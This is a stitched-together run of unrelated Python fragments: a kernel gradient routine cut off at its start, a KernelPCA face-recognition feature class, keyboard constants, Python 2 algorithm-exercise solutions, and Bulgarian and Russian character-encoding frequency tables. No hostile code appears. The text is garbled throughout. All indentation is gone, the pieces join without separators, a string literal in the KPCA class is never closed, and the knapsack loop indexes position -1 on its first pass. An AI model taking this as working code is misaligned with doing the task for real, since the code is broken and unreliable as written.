N1, D1 = x1.shape
if x2.size / len(x2) == 1:
N2 = 1
D2 = x2.size
else:
N2, D2 = x2.shape
assert D1 == D2, "x1 dimension not equal to x2"
assert D1 == self.dim, "data dimension not equal to the kernel"
diff = x1.reshape(N1, 1, D1) - x2.reshape(1, N2, D2)
diff = self.alpha * np.exp(-np.sum(np.square(diff) * self.gammas, -1) / 2)
return diff
def gradients(self, x1):
N1, D1 = x1.shape
diff = x1.reshape(N1, 1, D1) - x1.reshape(1, N1, D1)
sqdiff = np.sum(np.square(diff) * self.gammas, -1)
expdiff = np.exp(-sqdiff / 2)
grads = [-0.5 * g * np.square(diff[:, :, i]) * self.alpha * expdiff for i, g in enumerate(self.gammas)]
grads.insert(0, self.alpha * expdiff)
return grads
def gradients_wrt_data(self, x1, indexn=None, indexd=None):
N1, D1 = x1.shape
diff = x1.reshape(N1, 1, D1) - x1.reshape(1, N1, D1)
sqdiff = np.sum(np.square(diff) * self.gammas, -1)
expdiff = np.exp(-sqdiff / 2)
rslt = []
if (indexn is None) and (indexd is None):
for n in range(N1):
for d in range(D1):
K = np.zeros((N1, N1))
K[n, :] = -self.alpha * expdiff[n, :] * self.gammas[d] * (x1[n, d] - x1[:, d])
K[:, n] = K[n, :]
rslt.append(K.copy())
return rslt
else:
K = np.zeros((N1, N1))
K[indexn, :] = -self.alpha * self.gammas[indexd] * (x1[indexn, indexd] - x1[:, indexd]) * expdiff[indexn, :]
K[:, indexn] = K[indexn, :]
return K.copy()
from facerec_py.facerec.feature import AbstractFeature
import numpy as np
from facerec_py.facerec.util import asColumnMatrix
from sklearn.decomposition import KernelPCA
class KPCA(AbstractFeature):
def __init__(self, num_components=50, kernel="poly", degree=3, coef0=0.0, gamma=None):
AbstractFeature.__init__(self)
self._num_components = num_components
self._kernel = kernel
self._degree = degree
self._coef0 = coef0
self._gamma = gamma
self._kpca = None
def compute(self, X, y):
XC = asColumnMatrix(X)
y = np.asarray(y)
if self._num_components <= 0 or (self._num_components > XC.shape[1]-1):
self._num_components = XC.shape[1]-1
self._mean = XC.mean(axis=1).reshape(-1,1)
XC = XC - self._mean
n_features = XC.shape[0]
self._kpca = KernelPCA(n_components=self._num_components,
kernel=self._kernel,
degree=self._degree,
coef0=self._coef0,
gamma=self._gamma)
self._kpca.fit(XC.T)
features = []
for x in X:
features.append(self.extract(x))
return features
def extract(self,X):
X = np.asarray(X).reshape(-1,1)
return self.project(X)
def project(self, X):
X = X - self._mean
return self._kpca.transform(X.T)
@property
def num_components(self):
return self._num_components
def __repr__(self):
return "KernelPCA (num_components=%d)" % self._num_components
def short_name(self):
return "KernelPCA
CTRL_C = 7
CTRL_H = 2
CTRL_J = 14
CTRL_K = 16
CTRL_L = 6
CTRL_F = 8
ENTER = 13
CTRL_U = 11
ESC = 27
BACKSPACE =  127
TAB = 9
RIGHT = -1
DOWN = -2
UP = -3
LEFT = -4
SHIFTTAB = -5
SHIFTENTER = -6
SPACE = 32
ANTISLASH = 47
class Solution(object):
def solve(self, cipher):
n, k, A = cipher
f = [[0 for _ in xrange(k + 1)] for _ in xrange(n + 1)]
for i in xrange(n + 1):
for c in xrange(k + 1):
f[i][c] = f[i - 1][c]
temp = c - A[i - 1]
if temp >= 0:
f[i][c] = max(f[i - 1][c], f[i - 1][c - A[i - 1]] + A[i - 1], f[i][c - A[i - 1]] + A[i - 1])
return f[n][k]
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
n, k = map(int, f.readline().strip().split(' '))
A = map(int, f.readline().strip().split(' '))
cipher = n, k, A
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution:
def kthLargestElement(self, k, A):
k = len(A)-k
return self.find_kth(A, 0, len(A), k)
def find_kth(self, A, i, j, k):
p = self.pivot_optimized(A, i, j)
if k == p:
return A[p]
elif k < p:
return self.find_kth(A, i, p, k)
else:
return self.find_kth(A, p+1, j, k)
def pivot(self, A, i, j):
p = i
closed = p
for ptr in xrange(i, j):
if A[ptr] < A[p]:
closed += 1
A[closed], A[ptr] = A[ptr], A[closed]
A[closed], A[p] = A[p], A[closed]
return closed
def pivot_optimized(self, A, lo, hi):
i = lo
j = hi
while True:
while True:
i += 1
if i >= hi or A[i] >= A[lo]:
break
while True:
j -= 1
if j < lo or A[j] <= A[lo]:
break
if i >= j:
break
A[i], A[j] = A[j], A[i]
A[lo], A[j] = A[j], A[lo]
return j
def pivot_3way(self, A, lo, hi):
lt = lo-1
gt = hi
v = A[lo]
i = lo
while i < gt:
if A[i] < v:
lt += 1
A[lt], A[i] = A[i], A[lt]
i += 1
elif A[i] > v:
gt -= 1
A[gt], A[i] = A[i], A[gt]
else:
i += 1
return lt+1, gt
if __name__ == "__main__":
assert Solution().kthLargestElement(10, range(1, 11)) == 1
class QueueNode(object):
def __init__(self, val):
self.val = val
self.q = [val]
def __cmp__(self, other):
return self.val-other.val
def __repr__(self):
return repr(self.val)
def next(self):
self.q.pop(0)
self.val = self.q[0]
class Solution:
def kthPrimeNumber(self, k):
import heapq
h1 = QueueNode(3)
h2 = QueueNode(5)
h3 = QueueNode(7)
heap = [h1, h2, h3]
heapq.heapify(heap)
for cnt in xrange(k-1):
h = heapq.heappop(heap)
if h == h1:
h1.q.append(h1.val*3)
h2.q.append(h1.val*5)
h3.q.append(h1.val*7)
elif h == h2:
h2.q.append(h2.val*5)
h3.q.append(h2.val*7)
else:
h3.q.append(h3.val*7)
h.next()
heapq.heappush(heap, h)
return heapq.heappop(heap).val
def kthPrimeNumber_error(self, k):
import heapq
h1 = QueueNode(3)
h2 = QueueNode(5)
h3 = QueueNode(7)
heap = [h1, h2, h3]
heapq.heapify(heap)
for cnt in xrange(k-1):
h = heapq.heappop(heap)
if h == h1:
for i in [3, 5, 7]:
h1.q.append(i*h1.val)
h1.next()
heapq.heappush(heap, h1)
elif h == h2:
for i in [5, 7]:
h2.q.append(i*h2.val)
h2.next()
heapq.heappush(heap, h2)
else:
for i in [7]:
h3.q.append(i*h3.val)
h3.next()
heapq.heappush(heap, h3)
return heapq.heappop(heap).val
if __name__ == "__main__":
assert Solution().kthPrimeNumber(321) == 14586075
Latin5_BulgarianCharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253, 77, 90, 99,100, 72,109,107,101, 79,185, 81,102, 76, 94, 82,
110,186,108, 91, 74,119, 84, 96,111,187,115,253,253,253,253,253,
253, 65, 69, 70, 66, 63, 68,112,103, 92,194,104, 95, 86, 87, 71,
116,195, 85, 93, 97,113,196,197,198,199,200,253,253,253,253,253,
194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,
210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,
81,226,227,228,229,230,105,231,232,233,234,235,236, 45,237,238,
31, 32, 35, 43, 37, 44, 55, 47, 40, 59, 33, 46, 38, 36, 41, 30,
39, 28, 34, 51, 48, 49, 53, 50, 54, 57, 61,239, 67,240, 60, 56,
1, 18,  9, 20, 11,  3, 23, 15,  2, 26, 12, 10, 14,  6,  4, 13,
7,  8,  5, 19, 29, 25, 22, 21, 27, 24, 17, 75, 52,241, 42, 16,
62,242,243,244, 58,245, 98,246,247,248,249,250,251, 91,252,253,
)
win1251BulgarianCharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253, 77, 90, 99,100, 72,109,107,101, 79,185, 81,102, 76, 94, 82,
110,186,108, 91, 74,119, 84, 96,111,187,115,253,253,253,253,253,
253, 65, 69, 70, 66, 63, 68,112,103, 92,194,104, 95, 86, 87, 71,
116,195, 85, 93, 97,113,196,197,198,199,200,253,253,253,253,253,
206,207,208,209,210,211,212,213,120,214,215,216,217,218,219,220,
221, 78, 64, 83,121, 98,117,105,222,223,224,225,226,227,228,229,
88,230,231,232,233,122, 89,106,234,235,236,237,238, 45,239,240,
73, 80,118,114,241,242,243,244,245, 62, 58,246,247,248,249,250,
31, 32, 35, 43, 37, 44, 55, 47, 40, 59, 33, 46, 38, 36, 41, 30,
39, 28, 34, 51, 48, 49, 53, 50, 54, 57, 61,251, 67,252, 60, 56,
1, 18,  9, 20, 11,  3, 23, 15,  2, 26, 12, 10, 14,  6,  4, 13,
7,  8,  5, 19, 29, 25, 22, 21, 27, 24, 17, 75, 52,253, 42, 16,
)
BulgarianLangModel = (
0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,2,3,3,3,3,3,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,0,3,3,3,2,2,3,2,2,1,2,2,
3,1,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,0,3,3,3,3,3,3,3,3,3,3,0,3,0,1,
0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,2,3,3,3,3,3,3,3,3,0,3,1,0,
0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
3,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,1,3,2,3,3,3,3,3,3,3,3,0,3,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,2,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,1,3,2,3,3,3,3,3,3,3,3,0,3,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,3,3,3,2,3,2,2,1,3,3,3,3,2,2,2,1,1,2,0,1,0,1,0,0,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,3,3,2,3,2,2,3,3,1,1,2,3,3,2,3,3,3,3,2,1,2,0,2,0,3,0,0,
0,0,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,3,3,1,3,3,3,3,3,2,3,2,3,3,3,3,3,2,3,3,1,3,0,3,0,2,0,0,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,3,3,3,1,3,3,2,3,3,3,1,3,3,2,3,2,2,2,0,0,2,0,2,0,2,0,0,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,3,3,3,3,0,3,3,3,2,2,3,3,3,1,2,2,3,2,1,1,2,0,2,0,0,0,0,
1,0,0,0,0,0,0,0,0,0,2,0,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,3,3,2,3,3,1,2,3,2,2,2,3,3,3,3,3,2,2,3,1,2,0,2,1,2,0,0,
0,0,0,0,0,0,0,0,0,0,3,0,0,1,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,1,3,3,3,3,3,2,3,3,3,2,3,3,2,3,2,2,2,3,1,2,0,1,0,1,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,3,3,3,3,3,3,1,1,1,2,2,1,3,1,3,2,2,3,0,0,1,0,1,0,1,0,0,
0,0,0,1,0,0,0,0,1,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,2,2,3,2,2,3,1,2,1,1,1,2,3,1,3,1,2,2,0,1,1,1,1,0,1,0,0,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,1,3,2,2,3,3,1,2,3,1,1,3,3,3,3,1,2,2,1,1,1,0,2,0,2,0,1,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,2,2,3,3,3,2,2,1,1,2,0,2,0,1,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,
3,0,1,2,1,3,3,2,3,3,3,3,3,2,3,2,1,0,3,1,2,1,2,1,2,3,2,1,0,1,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,1,1,2,3,3,3,3,3,3,3,3,3,3,3,3,0,0,3,1,3,3,2,3,3,2,2,2,0,1,0,0,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,3,3,3,3,0,3,3,3,3,3,2,1,1,2,1,3,3,0,3,1,1,1,1,3,2,0,1,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,
3,3,2,2,2,3,3,3,3,3,3,3,3,3,3,3,1,1,3,1,3,3,2,3,2,2,2,3,0,2,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,2,3,3,2,2,3,2,1,1,1,1,1,3,1,3,1,1,0,0,0,1,0,0,0,1,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,2,3,2,0,3,2,0,3,0,2,0,0,2,1,3,1,0,0,1,0,0,0,1,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,2,1,1,1,1,2,1,1,2,1,1,1,2,2,1,2,1,1,1,0,1,1,0,1,0,1,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,2,1,3,1,1,2,1,3,2,1,1,0,1,2,3,2,1,1,1,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,3,3,3,3,2,2,1,0,1,0,0,1,0,0,0,2,1,0,3,0,0,1,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,2,3,2,3,3,1,3,2,1,1,1,2,1,1,2,1,3,0,1,0,0,0,1,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,1,1,2,2,3,3,2,3,2,2,2,3,1,2,2,1,1,2,1,1,2,2,0,1,1,0,1,0,2,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,2,1,3,1,0,2,2,1,3,2,1,0,0,2,0,2,0,1,0,0,0,0,0,0,0,1,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,
3,3,3,3,3,3,1,2,0,2,3,1,2,3,2,0,1,3,1,2,1,1,1,0,0,1,0,0,2,2,2,3,
2,2,2,2,1,2,1,1,2,2,1,1,2,0,1,1,1,0,0,1,1,0,0,1,1,0,0,0,1,1,0,1,
3,3,3,3,3,2,1,2,2,1,2,0,2,0,1,0,1,2,1,2,1,1,0,0,0,1,0,1,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,
3,3,2,3,3,1,1,3,1,0,3,2,1,0,0,0,1,2,0,2,0,1,0,0,0,1,0,1,2,1,2,2,
1,1,1,1,1,1,1,2,2,2,1,1,1,1,1,1,1,0,1,2,1,1,1,0,0,0,0,0,1,1,0,0,
3,1,0,1,0,2,3,2,2,2,3,2,2,2,2,2,1,0,2,1,2,1,1,1,0,1,2,1,2,2,2,1,
1,1,2,2,2,2,1,2,1,1,0,1,2,1,2,2,2,1,1,1,0,1,1,1,1,2,0,1,0,0,0,0,
2,3,2,3,3,0,0,2,1,0,2,1,0,0,0,0,2,3,0,2,0,0,0,0,0,1,0,0,2,0,1,2,
2,1,2,1,2,2,1,1,1,2,1,1,1,0,1,2,2,1,1,1,1,1,0,1,1,1,0,0,1,2,0,0,
3,3,2,2,3,0,2,3,1,1,2,0,0,0,1,0,0,2,0,2,0,0,0,1,0,1,0,1,2,0,2,2,
1,1,1,1,2,1,0,1,2,2,2,1,1,1,1,1,1,1,0,1,1,1,0,0,0,0,0,0,1,1,0,0,
2,3,2,3,3,0,0,3,0,1,1,0,1,0,0,0,2,2,1,2,0,0,0,0,0,0,0,0,2,0,1,2,
2,2,1,1,1,1,1,2,2,2,1,0,2,0,1,0,1,0,0,1,0,1,0,0,1,0,0,0,0,1,0,0,
3,3,3,3,2,2,2,2,2,0,2,1,1,1,1,2,1,2,1,1,0,2,0,1,0,1,0,0,2,0,1,2,
1,1,1,1,1,1,1,2,2,1,1,0,2,0,1,0,2,0,0,1,1,1,0,0,2,0,0,0,1,1,0,0,
2,3,3,3,3,1,0,0,0,0,0,0,0,0,0,0,2,0,0,1,1,0,0,0,0,0,0,1,2,0,1,2,
2,2,2,1,1,2,1,1,2,2,2,1,2,0,1,1,1,1,1,1,0,1,1,1,1,0,0,1,1,1,0,0,
2,3,3,3,3,0,2,2,0,2,1,0,0,0,1,1,1,2,0,2,0,0,0,3,0,0,0,0,2,0,2,2,
1,1,1,2,1,2,1,1,2,2,2,1,2,0,1,1,1,0,1,1,1,1,0,2,1,0,0,0,1,1,0,0,
2,3,3,3,3,0,2,1,0,0,2,0,0,0,0,0,1,2,0,2,0,0,0,0,0,0,0,0,2,0,1,2,
1,1,1,2,1,1,1,1,2,2,2,0,1,0,1,1,1,0,0,1,1,1,0,0,1,0,0,0,0,1,0,0,
3,3,2,2,3,0,1,0,1,0,0,0,0,0,0,0,1,1,0,3,0,0,0,0,0,0,0,0,1,0,2,2,
1,1,1,1,1,2,1,1,2,2,1,2,2,1,0,1,1,1,1,1,0,1,0,0,1,0,0,0,1,1,0,0,
3,1,0,1,0,2,2,2,2,3,2,1,1,1,2,3,0,0,1,0,2,1,1,0,1,1,1,1,2,1,1,1,
1,2,2,1,2,1,2,2,1,1,0,1,2,1,2,2,1,1,1,0,0,1,1,1,2,1,0,1,0,0,0,0,
2,1,0,1,0,3,1,2,2,2,2,1,2,2,1,1,1,0,2,1,2,2,1,1,2,1,1,0,2,1,1,1,
1,2,2,2,2,2,2,2,1,2,0,1,1,0,2,1,1,1,1,1,0,0,1,1,1,1,0,1,0,0,0,0,
2,1,1,1,1,2,2,2,2,1,2,2,2,1,2,2,1,1,2,1,2,3,2,2,1,1,1,1,0,1,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,2,2,3,2,0,1,2,0,1,2,1,1,0,1,0,1,2,1,2,0,0,0,1,1,0,0,0,1,0,0,2,
1,1,0,0,1,1,0,1,1,1,1,0,2,0,1,1,1,0,0,1,1,0,0,0,0,1,0,0,0,1,0,0,
2,0,0,0,0,1,2,2,2,2,2,2,2,1,2,1,1,1,1,1,1,1,0,1,1,1,1,1,2,1,1,1,
1,2,2,2,2,1,1,2,1,2,1,1,1,0,2,1,2,1,1,1,0,2,1,1,1,1,0,1,0,0,0,0,
3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,
1,1,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,2,2,3,2,0,0,0,0,1,0,0,0,0,0,0,1,1,0,2,0,0,0,0,0,0,0,0,1,0,1,2,
1,1,1,1,1,1,0,0,2,2,2,2,2,0,1,1,0,1,1,1,1,1,0,0,1,0,0,0,1,1,0,1,
2,3,1,2,1,0,1,1,0,2,2,2,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,0,1,0,1,2,
1,1,1,1,2,1,1,1,1,1,1,1,1,0,1,1,0,1,0,1,0,1,0,0,1,0,0,0,0,1,0,0,
2,2,2,2,2,0,0,2,0,0,2,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,2,0,2,2,
1,1,1,1,1,0,0,1,2,1,1,0,1,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,
1,2,2,2,2,0,0,2,0,1,1,0,0,0,1,0,0,2,0,2,0,0,0,0,0,0,0,0,0,0,1,1,
0,0,0,1,1,1,1,1,1,1,1,1,1,0,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,
1,2,2,3,2,0,0,1,0,0,1,0,0,0,0,0,0,1,0,2,0,0,0,1,0,0,0,0,0,0,0,2,
1,1,0,0,1,0,0,0,1,1,0,0,1,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,
2,1,2,2,2,1,2,1,2,2,1,1,2,1,1,1,0,1,1,1,1,2,0,1,0,1,1,1,1,0,1,1,
1,1,2,1,1,1,1,1,1,0,0,1,2,1,1,1,1,1,1,0,0,1,1,1,0,0,0,0,0,0,0,0,
1,0,0,1,3,1,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,2,2,2,1,0,0,1,0,2,0,0,0,0,0,1,1,1,0,1,0,0,0,0,0,0,0,0,2,0,0,1,
0,2,0,1,0,0,1,1,2,0,1,0,1,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,
1,2,2,2,2,0,1,1,0,2,1,0,1,1,1,0,0,1,0,2,0,1,0,0,0,0,0,0,0,0,0,1,
0,1,0,0,1,0,0,0,1,1,0,0,1,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,
2,2,2,2,2,0,0,1,0,0,0,1,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,1,
0,1,0,1,1,1,0,0,1,1,1,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,
2,0,1,0,0,1,2,1,1,1,1,1,1,2,2,1,0,0,1,0,1,0,0,0,0,1,1,1,1,0,0,0,
1,1,2,1,1,1,1,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,2,1,2,1,0,0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,1,
0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,0,0,1,2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
0,1,1,0,1,1,1,0,0,1,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,
1,0,1,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,1,0,2,0,0,2,0,1,0,0,1,0,0,1,
1,1,0,0,1,1,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,
1,1,1,1,1,1,1,2,0,0,0,0,0,0,2,1,0,1,1,0,0,1,1,1,0,1,0,0,0,0,0,0,
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,1,0,1,1,1,1,1,0,1,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
)
Latin5BulgarianModel = {
'charToOrderMap': Latin5_BulgarianCharToOrderMap,
'precedenceMatrix': BulgarianLangModel,
'mTypicalPositiveRatio': 0.969392,
'keepEnglishLetter': False,
'charsetName': "ISO-8859-5"
}
Win1251BulgarianModel = {
'charToOrderMap': win1251BulgarianCharToOrderMap,
'precedenceMatrix': BulgarianLangModel,
'mTypicalPositiveRatio': 0.969392,
'keepEnglishLetter': False,
'charsetName': "windows-1251"
}
from . import constants
KOI8R_CharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,
155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,
253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,
67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,
191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,
207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,
223,224,225, 68,226,227,228,229,230,231,232,233,234,235,236,237,
238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,
27,  3, 21, 28, 13,  2, 39, 19, 26,  4, 23, 11,  8, 12,  5,  1,
15, 16,  9,  7,  6, 14, 24, 10, 17, 18, 20, 25, 30, 29, 22, 54,
59, 37, 44, 58, 41, 48, 53, 46, 55, 42, 60, 36, 49, 38, 31, 34,
35, 43, 45, 32, 40, 52, 56, 33, 61, 62, 51, 57, 47, 63, 50, 70,
)
win1251_CharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,
155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,
253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,
67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,
191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,
207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,
223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,
239,240,241,242,243,244,245,246, 68,247,248,249,250,251,252,253,
37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,
45, 32, 40, 52, 53, 55, 58, 50, 57, 63, 70, 62, 61, 47, 59, 43,
3, 21, 10, 19, 13,  2, 24, 20,  4, 23, 11,  8, 12,  5,  1, 15,
9,  7,  6, 14, 39, 26, 28, 22, 25, 29, 54, 18, 17, 30, 27, 16,
)
latin5_CharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,
155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,
253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,
67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,
191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,
207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,
223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,
37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,
45, 32, 40, 52, 53, 55, 58, 50, 57, 63, 70, 62, 61, 47, 59, 43,
3, 21, 10, 19, 13,  2, 24, 20,  4, 23, 11,  8, 12,  5,  1, 15,
9,  7,  6, 14, 39, 26, 28, 22, 25, 29, 54, 18, 17, 30, 27, 16,
239, 68,240,241,242,243,244,245,246,247,248,249,250,251,252,255,
)
macCyrillic_CharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
